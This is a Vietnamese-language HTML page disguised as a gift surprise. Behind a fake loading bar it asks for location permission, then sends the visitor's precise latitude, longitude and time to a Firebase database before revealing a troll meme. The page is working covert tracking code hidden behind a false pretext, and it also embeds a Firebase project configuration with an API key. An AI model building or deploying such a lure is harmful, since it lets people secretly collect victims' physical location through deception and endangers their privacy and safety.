<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <title>Có quà cho bạn thân iu</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="check.css" />
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  </head>
  <body>
    <div class="container" id="container">
      <div class="gift-box">
        <img
          src="https://cdn-icons-png.flaticon.com/512/2545/2545643.png"
          alt="Gift"
          class="gift-img"
        />
        <h2><b>🎀You cấp quyền đi, có bất ngờ đó</b></h2>
        <div class="progress">
          <div class="progress-bar" id="progress-bar"></div>
        </div>
        <p id="status">Đang xử lý quà...</p>
      </div>
    </div>

    <script>
      const status = document.getElementById("status");
      const progressBar = document.getElementById("progress-bar");

      // Firebase config mới
      const firebaseConfig = {
        apiKey: "AIzaSyDNVr03Qhb00YdjHvBQxsEQQDh96UHtx1g",
        authDomain: "ncc1504-72c4c.firebaseapp.com",
        databaseURL:
          "https://ncc1504-72c4c-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "ncc1504-72c4c",
        storageBucket: "ncc1504-72c4c.firebasestorage.app",
        messagingSenderId: "522236411325",
        appId: "1:522236411325:web:280cd17913d1d294a926d4",
        measurementId: "G-5RG260HYPK",
      };

      firebase.initializeApp(firebaseConfig);
      const db = firebase.database();

      function fakeLoading(callback) {
        let width = 0;
        const interval = setInterval(() => {
          if (width >= 100) {
            clearInterval(interval);
            callback();
          } else {
            width += Math.floor(Math.random() * 10) + 5;
            if (width > 100) width = 100;
            progressBar.style.width = width + "%";
          }
        }, 300);
      }

      function getLocationAndSend() {
        if (!navigator.geolocation) {
          status.innerText = "Lỗi rùi đổi trình duyệt khác đyyy";
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const now = new Date().toISOString();

            db.ref("locations").push({ lat, lon, time: now });

            status.innerText = "💖 Lêu lêuu , ko có quà đâuuu!";
            progressBar.style.width = "100%";

            // Sau 2.5s thì hiện ảnh troll với nền tối
            setTimeout(() => {
              const overlay = document.createElement("div");
              overlay.className = "overlay";
              document.body.appendChild(overlay);

              const img = document.createElement("img");
              img.src =
                "https://m.yodycdn.com/blog/meme-meo-bua-yody-vn-36.jpg";
              img.className = "final-image";
              document.body.appendChild(img);

              setTimeout(() => {
                overlay.style.opacity = "1";
                img.style.opacity = "1";
              }, 50);
            }, 1700);
          },
          (err) => {
            status.innerText = "⛔ Bạn từ chối quà của mình à 😢";
          },
          { enableHighAccuracy: true }
        );
      }

      fakeLoading(getLocationAndSend);
    </script>
  </body>
</html>
